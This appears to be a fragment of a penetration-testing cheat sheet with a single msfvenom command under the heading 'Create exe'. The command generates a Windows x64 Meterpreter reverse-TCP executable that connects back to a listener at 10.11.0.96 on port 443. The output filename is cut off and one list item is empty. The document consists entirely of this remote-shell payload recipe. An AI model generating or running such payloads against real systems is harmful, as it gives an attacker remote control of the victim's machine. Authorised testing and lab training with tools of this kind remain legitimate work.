# Create exe
  - Windows x64
    ~~~
    msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.11.0.96 LPORT=443 -f exe -o reverse.ex
    ~~~
  - 
